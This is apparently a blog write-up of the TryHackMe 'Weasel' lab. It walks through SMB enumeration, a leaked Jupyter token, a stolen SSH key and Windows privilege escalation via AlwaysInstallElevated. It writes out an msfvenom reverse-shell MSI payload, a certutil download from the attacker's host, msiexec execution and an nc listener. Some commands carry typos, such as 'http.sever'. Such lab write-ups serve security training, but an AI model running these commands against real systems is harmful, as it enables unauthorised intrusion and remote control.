---
title: THM-Weasel
categories: [Writeup tryhackme]
tags: [tryhackme, pentest]
---


I think the data science team has been a bit fast and loose with their project resources.

#### Nmap Result

```bash 
nmap -sV -sC -O -T4 -n -Pn -oA fastscan -Pn
```

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-1.png){:width="70%"}

Based on the Nmap results, it appears that the machine is likely running a Windows operating system. This conclusion is supported by the presence of open ports associated with the SMB (Server Message Block) protocol, which is commonly used in Windows environments for file sharing and network communication. 

Additionally, the detection of a Jupyter Notebook deployment suggests that the machine may also be used for data science or development purposes. Jupyter Notebook is a popular platform for interactive computing, often utilized by data scientists and researchers. Taken together, the presence of open ports related to SMB and the availability of a Jupyter Notebook deployment point towards a Windows machine with potential data science or development activities.

#### Smb enumeration 

```bash 
smbclient --no-pass -L //10.10.215.176
```

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-2.png){:width="70%"}

we can see the available shares on a remote SMB server at the machine  there is available share named "datasci-team". but no additional comment or description is provided.

Let's connect to the datasci-team using smbclient. 
```bash 
smbclient --no-pass //10.10.215.176/datasci-team
```

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-3.png){:width="70%"}

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-4.png){:width="70%"}

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-5.png){:width="70%"}

It appears that the majority of the files are related to Weasel research. However, a noteworthy file of interest has been discovered. Within the "misc" directory, there is a file containing a Jupyter token, which could potentially provide access to the Jupyter Notebook instance.

#### Jupyter notebook 

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-6.png){:width="70%"}

With the Jupyter token we obtained, we can easily gain access to the Jupyter Notebook instance. By using this token, we can authenticate ourselves and access the features and functionalities provided by Jupyter Notebook.

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-7.png){:width="70%"}

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-8.png){:width="70%"}

By utilizing the functionality of Jupyter Notebook, it is possible to exploit a reverse shell technique, enabling us to gain access to the shell of the target machine.



#### Adding key to SSH Agent

Let's examine the user accounts by reviewing the contents of the /etc/passwd file. This file contains information about the users on the system, including their usernames, user IDs, group IDs, home directories, and default shells.

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-9.png){:width="70%"}

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-10.png){:width="70%"}

Upon inspecting the home directory of dev-datasci, we discovered several files associated with Jupyter Notebook and Anaconda. Of particular interest to us is the file named dev-datasci-lowpriv_id_ed25519, which we can utilize to establish a connection to the previously identified open SSH. 

We can simply add the obtained ssh keys using the commands below and connect the the ssh keys.
```bash
eval "$(ssh-agent -s)"
ssh-add dev-datasci-lowpriv_id_ed25519
ssh -i dev-datasci-lowpriv_id_ed25519 dev-datasci-lowpriv@10.10.215.176
```


#### User Flag

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-11.png){:width="70%"}

Once you have successfully connected to the SSH, you can easily retrieve the user flag located in the dev-datasci-lowpriv directory on the Desktop.

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-12.png){:width="70%"}

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-13.png){:width="70%"}


![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-14.png){:width="70%"}

Take note the results of the default creds of the Default User Name.

#### Privilege Escalation 

By executing the "net user" command, we can observe that there are a total of six user accounts, including our own. Our focus is on the administrator account.

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel.png){:width="70%"}

Through a registry query, it has been determined that the "AlwaysInstallElevated" key is currently set to 1. This configuration suggests that privilege escalation can be achieved by utilizing the "msiexec" command. As a next step, we can generate an MSI payload to exploit this opportunity.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip-address> LPORT=4445 -f msi -o reverse.msi
```

```bast 
# From our Machine hosting the payload
sudo python3 -m http.sever 80
```

```bash
# From Victim(Target) Machine
certutil -urlcache -split -f http://10.8.120.163/reverse.msi
```

To exfiltrate our msfvenom payload to the target machine, we can utilize Python and certutil. Following that, we can proceed with privilege escalation by leveraging the "AlwaysInstallElevated" registry setting.

```bash 
runas /user:dev-datasci-lowpriv "msiexec /i C:\Users\dev-datasci-lowpriv\Downloads\rev.msi /qn"
```

```
# listener 
nc -lvnp 4445
```

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-15.png){:width="70%"}

#### Root Flag 

![]({{site.baseurl}}/assets/img/2023-05-23-THM-Weasel-16.png){:width="70%"}

Once you have successfully gained access, you can effortlessly retrieve the root flag located in the Administrator directory on the Desktop.

--- 
#### References
- https://tryhackme.com/room/weasel
- https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54